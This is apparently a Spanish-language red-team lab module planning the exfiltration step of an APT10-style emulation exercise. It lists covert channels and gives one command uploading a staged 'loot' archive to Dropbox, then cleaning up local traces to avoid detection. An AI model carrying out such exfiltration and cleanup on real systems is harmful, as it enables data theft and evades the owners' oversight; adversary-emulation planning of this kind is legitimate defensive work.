# Módulo M3 · Exfiltración — sacar el dato — Lab-17 SILENT EXIT

> **Módulo M3 · Ruta: `[crítica · vías alternativas]`**
>
> **Objetivo único:** Exfiltrar el archivo staging por el canal con menor riesgo de detección: cloud legítimo (Dropbox/OneDrive), C2 si el volumen es pequeño, o DNS tunneling como último recurso.
>
> **Prerequisito real:** M2 (archivo staging listo).
>
> **Habilita:** datos en manos del operador fuera del perímetro del cliente.
>
> **TTP:** T1567.002 · T1041

## Plan de ejecución

Canal preferido: `dbxcli put loot.7z /exfil/` (Dropbox — APT10 documentado). Alternativa C2: subida vía beacon si el volumen lo permite. Verificar que la transferencia completó correctamente antes de limpiar el archivo local.

## Operativa real (completar al ejecutar)

> ⚠ Arquetipo operación: PLAN. Captura aquí los shares encontrados, el método de staging, el canal de exfil usado y los artefactos limpiados.

---

*Módulo M3 · Lab-17 Silent Exit · Cloud Hopper exit (anatomía v3.1, arquetipo operación)*
